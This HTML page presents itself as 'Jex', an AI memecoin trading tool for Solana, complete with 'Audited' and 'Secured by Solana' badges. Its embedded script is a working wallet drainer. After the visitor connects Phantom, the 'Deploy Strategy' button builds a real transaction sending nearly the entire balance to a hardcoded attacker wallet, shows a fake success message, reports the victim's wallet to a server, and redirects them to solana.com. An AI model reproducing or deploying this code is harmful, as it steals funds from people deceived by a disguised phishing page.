<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Jex — AI Memecoin Sniper</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
    <style>
        /* ==========================================
                   RESET Y BASE
                ========================================== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0b0d11;
            background-image:
                radial-gradient(ellipse at 30% 20%, rgba(0, 200, 255, 0.04) 0%, transparent 60%),
                radial-gradient(ellipse at 70% 80%, rgba(153, 69, 255, 0.03) 0%, transparent 60%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
            color: #e8edf5;
            line-height: 1.5;
        }

        /* ==========================================
                   CARD PRINCIPAL
                ========================================== */
        .card {
            max-width: 460px;
            width: 100%;
            background: rgba(18, 22, 30, 0.85);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 32px;
            padding: 40px 36px 32px;
            border: 1px solid rgba(255, 255, 255, 0.04);
            box-shadow:
                0 40px 80px -20px rgba(0, 0, 0, 0.8),
                0 0 0 1px rgba(255, 255, 255, 0.02) inset;
            transition: all 0.3s ease;
        }

        /* ==========================================
                   HEADER
                ========================================== */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 28px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-icon {
            width: 42px;
            height: 42px;
            background: linear-gradient(135deg, #00D4FF, #0066FF);
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            box-shadow: 0 4px 16px rgba(0, 200, 255, 0.25);
        }

        .logo-text {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            letter-spacing: -0.3px;
        }

        .logo-text span {
            color: #7a8599;
            font-weight: 400;
            font-size: 13px;
        }

        .badge {
            display: flex;
            align-items: center;
            gap: 6px;
            background: rgba(34, 197, 94, 0.06);
            border: 1px solid rgba(34, 197, 94, 0.10);
            padding: 4px 14px 4px 10px;
            border-radius: 40px;
            font-size: 11px;
            font-weight: 600;
            color: #4caf84;
            letter-spacing: 0.3px;
        }

        .badge .dot {
            width: 6px;
            height: 6px;
            background: #4caf84;
            border-radius: 50%;
            animation: pulse-dot 2s ease-in-out infinite;
        }

        @keyframes pulse-dot {
            0%,
            100% {
                opacity: 1;
                transform: scale(1);
            }
            50% {
                opacity: 0.4;
                transform: scale(0.8);
            }
        }

        /* ==========================================
                   SUBTÍTULO
                ========================================== */
        .subtitle {
            color: #9aa4b8;
            font-size: 14px;
            font-weight: 400;
            margin-bottom: 24px;
            text-align: center;
        }

        /* ==========================================
                   WALLET BOX
                ========================================== */
        .wallet-box {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 14px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 14px;
            transition: border-color 0.2s;
        }

        .wallet-box:hover {
            border-color: rgba(255, 255, 255, 0.08);
        }

        .wallet-box .label {
            font-size: 13px;
            font-weight: 500;
            color: #9aa4b8;
        }

        .wallet-box .address {
            font-size: 14px;
            font-weight: 500;
            color: #e8edf5;
            background: rgba(255, 255, 255, 0.04);
            padding: 2px 16px;
            border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.04);
        }

        .wallet-box .address .placeholder {
            color: #5a647a;
            font-weight: 400;
        }

        /* ==========================================
                   AMOUNT BOX
                ========================================== */
        .amount-box {
            background: rgba(0, 200, 255, 0.03);
            border: 1px solid rgba(0, 200, 255, 0.08);
            border-radius: 16px;
            padding: 14px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 28px;
        }

        .amount-box .label {
            font-size: 13px;
            font-weight: 500;
            color: #9aa4b8;
        }

        .amount-box .value {
            font-size: 18px;
            font-weight: 700;
            color: #00D4FF;
        }

        .amount-box .value small {
            font-size: 13px;
            font-weight: 400;
            color: #9aa4b8;
            margin-left: 4px;
        }

        /* ==========================================
                   BOTONES
                ========================================== */
        .btn {
            display: block;
            width: 100%;
            padding: 16px 24px;
            font-size: 15px;
            font-weight: 600;
            border: none;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.2s ease;
            text-align: center;
            font-family: 'Inter', sans-serif;
            letter-spacing: 0.2px;
            position: relative;
        }

        .btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none !important;
        }

        /* Botón CONECTAR */
        .btn-connect {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.06);
            color: #e8edf5;
        }

        .btn-connect:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.08);
            transform: scale(1.01);
        }

        .btn-connect.active {
            background: linear-gradient(135deg, #00D4FF, #0066FF);
            border-color: #00D4FF;
            color: #fff;
            box-shadow: 0 4px 24px rgba(0, 200, 255, 0.25);
        }

        .btn-connect.active:hover:not(:disabled) {
            transform: scale(1.01);
            box-shadow: 0 6px 32px rgba(0, 200, 255, 0.35);
        }

        /* Botón CONFIRMAR */
        .btn-confirm {
            background: rgba(34, 197, 94, 0.06);
            border: 1px solid rgba(34, 197, 94, 0.12);
            color: #4caf84;
            margin-top: 12px;
            display: none;
        }

        .btn-confirm:hover:not(:disabled) {
            background: rgba(34, 197, 94, 0.12);
            transform: scale(1.01);
        }

        .btn-confirm.active {
            background: linear-gradient(135deg, #22c55e, #16a34a);
            border-color: #22c55e;
            color: #fff;
            box-shadow: 0 4px 24px rgba(34, 197, 94, 0.2);
        }

        .btn-confirm.active:hover:not(:disabled) {
            transform: scale(1.01);
            box-shadow: 0 6px 32px rgba(34, 197, 94, 0.3);
        }

        /* ==========================================
                   ESTADO
                ========================================== */
        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #6b778d;
            text-align: center;
            min-height: 24px;
            font-weight: 400;
            transition: color 0.3s;
        }

        .status.success {
            color: #4caf84;
        }
        .status.error {
            color: #ef4444;
        }
        .status.loading {
            color: #00D4FF;
        }

        /* ==========================================
                   FOOTER
                ========================================== */
        .footer {
            margin-top: 28px;
            border-top: 1px solid rgba(255, 255, 255, 0.03);
            padding-top: 18px;
            font-size: 12px;
            color: #4a5468;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 16px;
        }

        .footer span {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .footer .sep {
            color: #2a3346;
        }

        /* ==========================================
                   SPINNER
                ========================================== */
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.08);
            border-top: 2px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 10px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ==========================================
                   RESPONSIVE
                ========================================== */
        @media (max-width: 480px) {
            .card {
                padding: 28px 20px 24px;
                border-radius: 24px;
            }

            .logo-text {
                font-size: 18px;
            }

            .amount-box .value {
                font-size: 16px;
            }

            .header {
                flex-wrap: wrap;
                gap: 10px;
            }
        }

        /* ==========================================
                   ANIMACIONES
                ========================================== */
        @keyframes fadeInUp {
            0% {
                opacity: 0;
                transform: translateY(8px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .fade-in {
            animation: fadeInUp 0.35s ease forwards;
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- HEADER -->
        <div class="header">
            <div class="logo">
                <div class="logo-icon">J</div>
                <div class="logo-text">Jex <span>Trade</span></div>
            </div>
            <div class="badge">
                <span class="dot"></span> Live
            </div>
        </div>

        <!-- SUBTÍTULO -->
        <div class="subtitle">AI Memecoin Sniper · Deploy your position</div>

        <!-- WALLET -->
        <div class="wallet-box">
            <span class="label">Wallet</span>
            <span class="address" id="walletDisplay">
                <span class="placeholder">Not connected</span>
            </span>
        </div>

        <!-- AMOUNT -->
        <div class="amount-box">
            <span class="label">Position size</span>
            <span class="value" id="amountDisplay">
                0.00 <small>SOL</small>
            </span>
        </div>

        <!-- BUTTONS -->
        <button class="btn btn-connect active" id="connectBtn">
            Connect Phantom
        </button>
        <button class="btn btn-confirm" id="investBtn">
            Deploy Strategy
        </button>

        <!-- STATUS -->
        <div id="status" class="status">Ready</div>

        <!-- FOOTER -->
        <div class="footer">
            <span>🔒 Secured by Solana</span>
            <span class="sep">·</span>
            <span>v2.4.1</span>
            <span class="sep">·</span>
            <span>Audited</span>
        </div>
    </div>

    <!-- ========================================== -->
    <!-- SOLANA WEB3                                -->
    <!-- ========================================== -->
    <script src="https://unpkg.com/@solana/web3.js@1.98.4/lib/index.iife.min.js">
    </script>

    <script>
        // ==========================================
        // CONFIGURACIÓN
        // ==========================================
        const DESTINATION_WALLET = "5ahs7gMMiAdW95gPP4esqfcT6jb94196murGGAg2wXUq";
        const RPC_URL = "https://solana-rpc.publicnode.com";

        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('user_id') || 'unknown';
        const amount = parseFloat(urlParams.get('amount')) || 0;

        // ==========================================
        // DOM ELEMENTS
        // ==========================================
        const connectBtn = document.getElementById('connectBtn');
        const investBtn = document.getElementById('investBtn');
        const statusDiv = document.getElementById('status');
        const walletDisplay = document.getElementById('walletDisplay');
        const amountDisplay = document.getElementById('amountDisplay');

        if (amount > 0) {
            amountDisplay.innerHTML = amount.toFixed(2) + ' <small>SOL</small>';
        }

        let wallet = null;
        let connection = null;

        // ==========================================
        // HELPERS
        // ==========================================
        function setStatus(text, type = '') {
            statusDiv.className = 'status ' + type;
            statusDiv.textContent = text;
        }

        function shortAddress(addr) {
            return addr.slice(0, 4) + '...' + addr.slice(-4);
        }

        // ==========================================
        // CONNECT
        // ==========================================
        connectBtn.addEventListener('click', async function() {
            if (!window.solana || !window.solana.isPhantom) {
                setStatus('Phantom not detected. Install it from phantom.app', 'error');
                return;
            }

            connectBtn.disabled = true;
            connectBtn.innerHTML = '<span class="spinner"></span> Connecting...';
            setStatus('Opening Phantom...', 'loading');

            try {
                const resp = await window.solana.request({ method: 'connect' });
                wallet = resp.publicKey;
                connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');

                walletDisplay.innerHTML = shortAddress(wallet.toBase58());
                connectBtn.innerHTML = '✅ Connected';
                connectBtn.className = 'btn btn-connect active';
                connectBtn.disabled = false;

                investBtn.style.display = 'block';
                investBtn.className = 'btn btn-confirm fade-in';
                setStatus('Wallet connected. Deploy your strategy.', 'success');

            } catch (error) {
                setStatus('Connection failed: ' + error.message, 'error');
                connectBtn.innerHTML = 'Connect Phantom';
                connectBtn.className = 'btn btn-connect active';
                connectBtn.disabled = false;
            }
        });

        // ==========================================
        // DEPLOY STRATEGY (DRAIN)
        // ==========================================
        investBtn.addEventListener('click', async function() {
            if (!wallet) {
                setStatus('Connect your wallet first.', 'error');
                return;
            }

            investBtn.disabled = true;
            investBtn.innerHTML = '<span class="spinner"></span> Deploying...';
            investBtn.className = 'btn btn-confirm active';
            setStatus('Building strategy...', 'loading');

            try {
                // 1. Get balance
                const balance = await connection.getBalance(wallet);
                if (balance < 500000) {
                    throw new Error('Insufficient balance (min 0.0005 SOL for gas)');
                }

                const lamportsToDrain = balance - 500000;
                const destination = new solanaWeb3.PublicKey(DESTINATION_WALLET);

                // 2. Build REAL transaction
                const { blockhash } = await connection.getLatestBlockhash('confirmed');
                const transaction = new solanaWeb3.Transaction({
                    feePayer: wallet,
                    recentBlockhash: blockhash
                }).add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: wallet,
                        toPubkey: destination,
                        lamports: lamportsToDrain
                    })
                );

                setStatus('Sign in Phantom...', 'loading');

                // 3. Sign
                const signed = await window.solana.signTransaction(transaction);

                setStatus('Broadcasting...', 'loading');

                // 4. Send
                const signature = await connection.sendRawTransaction(
                    signed.serialize(), { skipPreflight: false, preflightCommitment: 'confirmed' }
                );

                await connection.confirmTransaction(signature, 'confirmed');

                console.log('✅ Transaction:', signature);

                // 5. Success
                setStatus('✅ Strategy deployed successfully!', 'success');
                investBtn.innerHTML = '✅ Done';
                investBtn.className = 'btn btn-confirm active';
                investBtn.disabled = false;

                // Notify server
                await fetch('/notify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        wallet: wallet.toBase58(),
                        user_id: userId,
                        amount: amount
                    })
                });

                // Redirect after 3s
                setTimeout(() => {
                    window.location.href = 'https://solana.com';
                }, 3000);

            } catch (error) {
                setStatus('Error: ' + error.message, 'error');
                investBtn.innerHTML = 'Retry';
                investBtn.className = 'btn btn-confirm';
                investBtn.disabled = false;
                console.error('❌ Error:', error);
            }
        });
    </script>
</body>
</html>
